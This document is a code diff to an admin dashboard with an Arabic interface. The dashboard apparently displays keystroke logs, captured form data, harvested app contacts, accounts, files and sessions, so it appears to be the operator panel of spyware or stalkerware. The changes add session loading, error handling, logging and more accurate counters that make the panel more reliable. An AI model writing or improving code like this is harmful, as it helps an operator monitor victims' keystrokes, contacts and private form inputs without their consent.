@@ -394,7 +394,8 @@
             loadAccounts(),
             loadKeylogs(),
             loadFormData(),
-            loadAppContacts()
+            loadAppContacts(),
+            loadSessions()
         ]);
         updateStats();
         updateTime();
@@ -413,8 +414,11 @@ async function loadAppContacts() {
             .limit(20)
             .get();
 
-        const appContactsList = document.getElementById('app-contacts-list');
-        if (!appContactsList) return;
+          const appContactsList = document.getElementById('app-contacts-list');
+        if (!appContactsList) {
+            console.warn('Element app-contacts-list not found');
+            return;
+        }
 
         appContactsList.innerHTML = '';
 
@@ -422,6 +426,7 @@ async function loadAppContacts() {
             appContactsList.innerHTML = '<div class="no-data">لا توجد جهات اتصال من التطبيقات</div>';
             return;
         }
+        
         snapshot.forEach(doc => {
             const appContact = doc.data();
             const appContactElement = `
@@ -441,8 +446,12 @@ async function loadAppContacts() {
             appContactsList.innerHTML += appContactElement;
         });
 
-    } catch (error) {
+        } catch (error) {
         console.error('Error loading app contacts:', error);
+        const appContactsList = document.getElementById('app-contacts-list');
+        if (appContactsList) {
+            appContactsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل جهات اتصال التطبيقات</div>';
+        }
     }
 }
         // تحميل جهات الاتصال
@@ -640,28 +649,36 @@ async function loadAppContacts() {
     document.getElementById('files-count').textContent = allFiles.length;
     document.getElementById('accounts-count').textContent = allAccounts.length;
     document.getElementById('sessions-count').textContent = allSessions.length;
+    
     // تحديث جميع الـ badges
     document.getElementById('contacts-badge').textContent = allContacts.length;
     document.getElementById('files-badge').textContent = allFiles.length;
     document.getElementById('accounts-badge').textContent = allAccounts.length;
     document.getElementById('sessions-badge').textContent = allSessions.length;
-                // ✅ تحديث الـ badges للأقسام الجديدة
+    
+    // ✅ تحديث الـ badges للأقسام الجديدة - حساب العناصر الفعلية فقط
+    const countDataItems = (elementId) => {
+        const element = document.getElementById(elementId);
+        if (!element) return 0;
+// حساب فقط العناصر التي تحتوي على class "data-item"
+        return Array.from(element.children).filter(child => 
+            child.classList.contains('data-item')
+        ).length;
+    };
+    
     const keylogsBadge = document.getElementById('keylogs-badge');
     const formsBadge = document.getElementById('forms-badge');
     const appContactsBadge = document.getElementById('app-contacts-badge');
     
     if (keylogsBadge) {
-        const keylogsCount = document.getElementById('keylogs-list')?.children.length || 0;
-        keylogsBadge.textContent = keylogsCount;
+        keylogsBadge.textContent = countDataItems('keylogs-list');
+    }
+            if (formsBadge) {
+        formsBadge.textContent = countDataItems('forms-list');
     }
     
-    if (formsBadge) {
-        const formsCount = document.getElementById('forms-list')?.children.length || 0;
-        formsBadge.textContent = formsCount;
-    }
-                if (appContactsBadge) {
-        const appContactsCount = document.getElementById('app-contacts-list')?.children.length || 0;
-        appContactsBadge.textContent = appContactsCount;
+    if (appContactsBadge) {
+        appContactsBadge.textContent = countDataItems('app-contacts-list');
     }
 }
         function formatPhone(phone) {
@@ -722,28 +739,36 @@ document.addEventListener('DOMContentLoaded', async function() {
             
             // إضافة مستمعي الأحداث
             netlifyIdentity.on('login', () => {
+                console.log('User logged in, loading data...');
                 loadAllData();
             });
             
             netlifyIdentity.on('logout', () => {
+                console.log('User logged out, redirecting...');
                 window.location.href = 'index.html';
             });
         }
+        
                 // تحميل البيانات الأولي بعد التحقق من المصادقة
-        const isAuthenticated = await authenticateAdmin();
+const isAuthenticated = await authenticateAdmin();
         if (isAuthenticated) {
-            loadAllData();
+            console.log('Admin authenticated, starting data load...');
+            await loadAllData();
             
             // تحديث الوقت كل دقيقة
             setInterval(updateTime, 60000);
             
             // تحديث تلقائي للبيانات كل 30 ثانية
-            setInterval(loadAllData, 30000);
+            setInterval(async () => {
+                console.log('Auto-refreshing data...');
+                await loadAllData();
+            }, 30000);
+        } else {
+            console.log('Admin authentication failed');
         }
-        
-    } catch (error) {
+            } catch (error) {
         console.error('Initialization error:', error);
-        showError('خطأ في تهيئة النظام');
+        showError('خطأ في تهيئة النظام: ' + error.message);
     }
 });
         // ========== مصادقة المسؤول ==========
@@ -844,14 +869,19 @@ async function loadFormData() {
             .get();
 
         const formsList = document.getElementById('forms-list');
-        formsList.innerHTML = '';
+        if (!formsList) {
+            console.warn('Element forms-list not found');
+            return;
+        }
+        
+          formsList.innerHTML = '';
 
         if (snapshot.empty) {
             formsList.innerHTML = '<div class="no-data">لا توجد بيانات نماذج</div>';
             return;
                     }
 
-        snapshot.forEach(doc => {
+snapshot.forEach(doc => {
             const form = doc.data();
             const formElement = `
                 <div class="data-item">
@@ -869,11 +899,15 @@ async function loadFormData() {
             `;
             formsList.innerHTML += formElement;
         });
-
     } catch (error) {
         console.error('Error loading form data:', error);
+        const formsList = document.getElementById('forms-list');
+        if (formsList) {
+            formsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل بيانات النماذج</div>';
+        }
     }
 }
+
     </script>
 </body>
 </html>
